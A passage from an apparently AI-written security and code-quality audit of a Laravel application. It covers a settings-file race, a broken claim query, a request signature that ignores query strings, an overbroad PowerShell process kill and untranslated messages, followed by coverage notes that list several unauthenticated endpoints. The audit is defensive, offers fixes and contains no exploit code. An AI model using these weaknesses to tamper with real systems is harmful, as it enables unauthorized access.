- suggested fix: Cache the sorted pair index per language (invalidated on library writes), or paginate in SQL over a membership table.

### LB-030 — UserConfigService readers can load a torn (empty) settings file and cache it for the rest of the scoped lifetime
- severity: low · category: race · confidence: likely
- location: app/Services/UserConfig/UserConfigService.php:93-135,160-176
- failure scenario: `set()` does `ftruncate` then `fwrite` under LOCK_EX, but `load()` reads with `file_get_contents` without LOCK_SH. A timer `isEnabled()` that reads between the truncate and the write decodes `[]` and applies defaults (for example `appqyv1_library_cover_fallback_enabled` defaults to true). It caches that with the new mtime (1 s granularity), so the scoped instance in the `schedule:run` process keeps the defaults until the next write.
- evidence: `$raw = is_file($path) ? (string) @file_get_contents($path) : '';` with no lock. The writer truncates in place.
- suggested fix: Write through `FileSystemManager::writeFileAtomic` (temp file plus rename), or take LOCK_SH in `load()`.

### LB-031 — The legacy `tts/sentence/claim` candidate query includes completed rows, so once the top 250 by occurrence are complete it returns nothing (the endpoint is public and pycore no longer uses it)
- severity: low · category: queue-claim · confidence: likely
- location: app/Apps/AppQyV1/AppQyV1Models/AppQyV1LangSentenceModel.php:184-203; AppQyV1SentenceAudioService.php:170-199
- failure scenario: The WHERE clause has `OR (has_audio=true AND tts_status='completed')` and orders by `occurrence_count DESC LIMIT 250 FOR UPDATE`. When the 250 most frequent sentences have all their variants on disk, each claim locks the same 250 rows, stats every variant file, skips all of them and returns `[]`. Sentences without audio further down are never handed out. Each call also takes 250 row locks, and anyone can trigger it without auth.
- evidence: the claim loop does `if ($missing === []) continue;`. pycore's LaravelSentenceAudioWorker pulls the global_tasks `sentence_audio` lane instead (pycore/pyctl/tts/laravel_audio_worker.py:884-899).
- suggested fix: Remove the dead route, or drop the completed branch and page past fully covered rows (keyset on occurrence_count, id).

### LB-032 — The machine signature canonical string leaves out the query string, so query parameters of a signed GET can be changed without breaking the signature
- severity: low · category: security-auth · confidence: likely
- location: app/Services/Relay/RelayDeviceIdentity.php:65-72
- failure scenario: A signed request with query parameters (for example `logs/latest?file_id=…&offset=…`) covers only `METHOD\n/path\nmachine\nts\nnonce\nsha256(body)`. An on-path party (a TLS-terminating proxy or a compromised relay hop) that intercepts the request before it reaches Laravel can rewrite the query and forward it. The signature still verifies, and the nonce is still unused, so it is accepted.
- evidence: `'/'.$request->path()`. `path()` drops the query.
- suggested fix: Sign the full `getRequestUri()` (path plus canonical sorted query).

### LB-033 — `scripts/start.ps1` kills every `php.exe` running `artisan serve|schedule:work|queue:listen|reverb:start` machine-wide, whichever project it belongs to
- severity: low · category: windows · confidence: confirmed
- location: poly_apps/laravel_main/scripts/start.ps1:662-685
- failure scenario: A Windows developer runs a second Laravel project with `php artisan schedule:work`. Starting laravel_main's foreground session force-stops that process, because the match looks only at the command line and not the working directory or the artisan path. Step (2) also stops whatever process owns port 9000, even when it is unrelated.
- evidence: `$_.CommandLine -match 'artisan\s+schedule:work'` has no path filter, and `Stop-Process -Id $stopPid -Force`.
- suggested fix: Match on this project's resolved `artisan` path (Join-Path of the laravel_main root) in the command line before stopping.

### LB-034 — About 446 hardcoded English API response messages bypass the lang files (AGENTS.md i18n rule)
- severity: low · category: rule · confidence: confirmed
- location: top offenders: app/Apps/CodeMartV1/CodeMartV1Ctl/CodeMartV1TaskCtl.php (33), CodeMartV1ProjectCtl.php (23), AppQyV1ProfileController.php (16), ServerManagerV1CertificateManagerCtl.php (15), AppQyV1TTSQueueController.php (13); also every DataSync exception message surfaced to the UI (DataSyncPeerClient, DataSyncPassiveService, DataSyncService) and AppQyV1VocabularyCoverTaskCtl.php:52,70
- failure scenario: A zh_CN user sees English `message` text such as "Only the project owner can publish this project", "Synchronization session cancelled by the operator.", "Library cover tasks queued". The CodeMart UI shows `message` whenever it has no mapping for the error code.
- evidence: `grep -E "(->success\([^;]*, '[A-Z][a-z]|->error\('[A-Z][a-z]|codedError\([^,]+, '[A-Z][a-z])" app` → 446 hits. New code such as `AppQyV1OrchAudioCtl` already uses `__('audio_orchestration.*')`.
- suggested fix: Move the messages into `lang/{en,zh_CN}/*.php` and call `__()`. Keep the machine `error_code` values as they are.

## Cross-scope

- **pycore-runtime / audio-tts (callers of the unauthenticated worker surface).** pycore's delivery layer, LaravelSentenceAudioWorker/TTS workers, orchestrated-audio delivery (`orch_audio/ingest/*`, `delivery/*`) and article worker submit call routes that have no auth today (LB-005, LB-006). Fixing them needs a signing client on the pycore side. The only existing machine gate, `pycore.client`, is itself broken (LB-015). The fix is blocked on L3 (Queue Center machine authentication design).
- **lead (contracts).** `config/pycore_relay_contract.json` defines enrollment as `/api/relay/device-enrollments`, while `RelayDeviceIdentity::isRegistration` expects `api/relay/machine/register` (LB-015). A decision is needed on the single device-identity store. The W5/W7 contract docs state "Delivery routes run at the pycore worker trust level (no login)" and so write down the LB-005/LB-006 exposure as design; that needs a lead ruling.
- **infra-shell.** (1) The FrankenPHP timer runs through `schedule:work`, so the fix for LB-011/LB-012 may need launcher changes (a separate long-task process). (2) `DASHBOARD_LOCAL_DEBUG` defaults to on; installer or global-var scripts for public servers should set it to `false` (LB-002). (3) `scripts/start.ps1` process cleanup (LB-033) sits under laravel_main/scripts, but it mirrors `laravel_main_runtime_common.sh`, whose `pgrep -f 'artisan schedule:work'` has the same any-project match.
- **frontend-ui.** (1) Once LB-002 is fixed, non-admin tokens get 403 on `dashboard/*`. laravel-manager's DatabaseManager/DataSyncTab and the Mercure authorization call need to handle that. (2) The CodeMart UI shows server `message` text, which is English-only (LB-034). (3) The CodeMart deposit UI opens the placeholder Alipay/WeChat `payment_url` (LB-020).

## Coverage

- **Fully read:** app/Services/DataSync/* (all 18 files); Http/Controllers/Dashboard/DataSyncController.php; Http/Requests/DataSync/PrepareDataSyncExporterRequest.php; routes/DashboardRouter/DatabaseManager.php; Services/TimerTasks/DataSyncTask.php; Services/OctaneTimerService.php; TimerTasks/OctaneTimerTaskInterface.php and OctaneTimerTaskAbstract.php; Providers/OctaneTimerServiceProvider.php; Services/OctaneTimerTaskCatalog.php; bootstrap/app.php; Utils/RedisBucketIndex.php; AppQyV1ResourceIndexService.php and its ReconcileTask; AppQyV1OrchAudioCtl.php, AppQyV1OrchAudioService.php, routes AppQyV1OrchAudio.php, the orch_audio_tasks migration and the orch lang keys; AppQyV1DurableOffsetUploadService.php; DictLane/DictLaneQueueCenter.php; Support/LaravelServerIdentity.php; UserConfig/UserConfigService.php; the CodeMart money path (EscrowService, FinanceService, AdminFinanceService, PaymentCtl, DepositCtl, FundingCtl, TaskStateService, ProjectStateService, TaskCtl, ProjectCtl, WalletModel, EscrowModel methods, routes/CodeMartV1Router/api.php); AppQyV1LibraryCoverTaskService.php, AppQyV1VocabularyCoverTaskCtl.php, AppQyV1LibraryCoverFallbackTask.php; DingDuoDuoV1RechargeController.php; Middleware/LocalDebugOrSanctum.php; Services/Relay/RelayDeviceIdentity.php; ServerManagerV1BaseCtl.php; System/TokenSessionController.php.
- **Partially read (the named functions):** Utils/FileSystemManager.php (lines 1-620); DatabaseSyncService (all of it except the step helpers were read); TaskManagerService (audio lock, submitResult, releaseTimedOutTasks); Models/Concerns/GlobalTaskQueueQueries.php (claim, head move, purge, expire); QueueCenterService (enqueue); WorkerController (register, heartbeat, pull hook); TaskController (clean/reset); AppQyV1VocabularyLibraryPublicController (regenerateCoverAi, getLibraries, buildWordsForLanguage); AppQyV1SentenceAudioController, AppQyV1SentenceAudioService and AppQyV1LangSentenceModel (claim path); CodeMart ArchitectCtl, TaskMarketplaceCtl, AIAnalysisCtl (access checks), RegistrationCtl, OtpService, BootstrapService (onboarding), FileUploadService, AdminCtl (auth), AdminService (confirmDeposit), CodeMartV1Constants (transitions); DatabaseManagerController and DatabaseManagerService (export/credentials); AiLocalController (keys, chat, images) and the AiGateway store lock patterns; PycoreEdgeTTSUtil (command build); MediaBrowseController (clip); ItToolsV1MathCtl::evaluate (not RCE: the character whitelist blocks calls); PddToolV1RechargeController (notify verification is correct); AgentHistoryArticleSubmissionService (insertOrIgnore idempotency is fine); scripts/start.ps1 (process cleanup); PathMapper (resource-root getters); every file under routes/ was surveyed for auth middleware.
- **Not read (focus list):** AiGateway/AiGateway.php body; CodeMartV1AdminService except confirmDeposit; CodeMartV1Initializer; CodeMartV1DemoSeeder; CodeMartV1ApiInfo; CodeMartV1TablesMaps; PublicHomeService/Ctl; RoleRequestService; TestimonialService/Ctl; EstimateService; DomainEventService; ReviewerCtl; ProfileCtl; most CodeMart models; AppQyV1ApiInfo; CommonApiInfo; AppQyV1VocabularyLibraryModel; AppQyV1LangDictionaryModel; AppQyV1UnifiedTTSQueueService; AppQyV1DictionaryTTSCoordinator; AppQyV1Assist* (MediaOperations, Controller, Overview, QueueMetrics); QueueCenterMetricsService; QueueCenterContract; QueueHeadNotificationService; TaskCenterSummaryService; AppQyV1SentenceAudioLookupTrait; AppQyV1AudioGateway (beyond requestWord); AppQyV1VocabularyCoverService; LibraryCoverTaskProcessor; AppQyV1CoverGenerationTask (exec only); AppQyV1VocabularyStatsController; AppQyV1SourceSentenceModel; Social/Translation event models; EcdictDictionary; AppQyV1EcdictLookupCtl; DictLaneCatalog/Maintenance/TableProbe (catalog constants only); ServerManagerV1UnifiedManagerCtl, PathConfig, Constants, FrankenPhpReloadJob; CheckCertbotCommand; Logging/*; config/database.php, services.php, logging.php; verify_timer_system.php; bootstrap/cache/*; WordAudioLocalController; RelayContract; RelayDeviceService; the other timer tasks (Presence, Poster, OverviewWarm, AiPromptFanout, GlobalTaskMaintenance, RelayMaintenance, QueueHeadNotification); the orch_audio_segments migration.
- **Coverage-order step 2:** B1 (DataSync, fully), B3 (CodeMart money and transitions, fully; milestones and attachments read; skills and invoices partial), agent-history ingest (idempotent insert checked), relay V2 Laravel side (device identity only), and the diff-delivery Redis index (fully) were covered. B4 keyset/sentence listing is not implemented yet (board: open); only DictLaneQueueCenter was audited. The Mercure/FrankenPHP API was reviewed only through the hub-authorization route auth.
- **Step 3 (rest of scope):** only the route-level auth survey across all routes/*.php. About 130k lines of app/Apps, most of app/Services, database/ (33k lines, beyond the CodeMart index grep and the orch migration), app/Http outside the named controllers, and Models were not read line by line.
- **Also seen, not reported (low impact):** unauthenticated `DELETE /api/public/avatar-cache`, `POST /api/octane/timer/reset-stats|pycore/refresh`, `GET /api/config/paths` (absolute path disclosure) and `servermanager/v1/certificates/progress/{id}` (unauthenticated certbot output by request id).
- **Files under active edit during the audit (02:15-02:26):** AppQyV1OrchAudio*, AppQyV1ResourceIndexService, AppQyV1ResourceIndexReconcileTask, AppQyV1DeliveryDiffService and routes/api.php were changing while I read them; findings LB-026/LB-027 may already be stale.
- **Audit halted by user:** the re-read of files changed after 02:10 (rule b), the `[in-flight]` tagging and the dedup against reviewer RV-00x were not done. LB-026 and LB-027 (orch-audio) are untagged in-flight findings.
